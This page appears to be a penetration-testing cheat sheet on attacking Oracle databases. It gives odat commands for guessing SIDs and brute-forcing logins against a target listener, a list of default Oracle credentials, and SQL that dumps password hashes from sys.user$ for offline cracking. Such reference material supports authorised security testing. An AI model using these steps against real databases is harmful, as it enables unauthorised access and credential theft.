---
title: "Oracle access and enumeration: TNS, SIDs, and default accounts"
description: "Enumerating the Oracle TNS listener and its SIDs, testing the many default and weak Oracle accounts, and extracting schema information and password hashes once a database session is established."
keywords:
  - TNS listener
  - SID enumeration
  - default credentials
  - sys.user$
  - ODAT
---

# Oracle access and enumeration

Oracle access is a two-stage problem: first find a valid **SID** behind the TNS listener, then find an account that works against it. Both are automated by `odat`, and default credentials make the second stage succeed far more often than it should.

## Listener and SID enumeration

```bash
# Comprehensive scan: listener info, SID guessing, credential testing
odat all -s <target> -p 1521

# Just enumerate SIDs (brute and version-based)
odat sidguesser -s <target> -p 1521
```

## Default and weak accounts

Oracle ships a long list of default accounts, and many survive in the wild:

```bash
# Guess credentials against a known SID (default account list + wordlists)
odat passwordguesser -s <target> -p 1521 -d <SID> --accounts-file accounts.txt
```

```text
# Classic defaults worth trying first
SYSTEM/manager   SYS/change_on_install   SCOTT/tiger   DBSNMP/dbsnmp   OUTLN/outln
```

## Post-authentication enumeration

```sql
-- with a session (sqlplus user/pass@//target/SID)
SELECT * FROM user_role_privs;                 -- my roles (DBA?)
SELECT name, password, spare4 FROM sys.user$;  -- password hashes (needs privilege)
SELECT * FROM session_privs;                   -- my system privileges
```

## Exploitation notes

- A valid SID is the prerequisite for everything, so run `sidguesser` first; a wrong or missing SID makes credential tests meaningless.
- **DBA** or a role with `CREATE PROCEDURE`/`CREATE ANY ...` is the gate to [command execution](command-execution.md); check `user_role_privs` immediately.
- `sys.user$` hashes (and the 11g+ `spare4` SHA values) crack offline, extending access to other instances where accounts are reused.
- Oracle default accounts are the single most reliable foothold, so exhaust the default list before deeper brute force.

## Tools

- **ODAT** (`all`, `sidguesser`, `passwordguesser`): end-to-end listener, SID, and credential enumeration.
- **sqlplus / python-oracledb**: authenticated session for schema and hash extraction.
- **nmap `oracle-sid-brute`**: alternative SID enumeration.

## References

- [ODAT (Oracle Database Attacking Tool)](https://github.com/quentinhardy/odat)
- [HackTricks: pentesting Oracle TNS](https://hacktricks.wiki/en/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/index.html)
- [Oracle: default user accounts](https://docs.oracle.com/en/database/oracle/oracle-database/19/dbseg/keeping-your-oracle-database-secure.html)
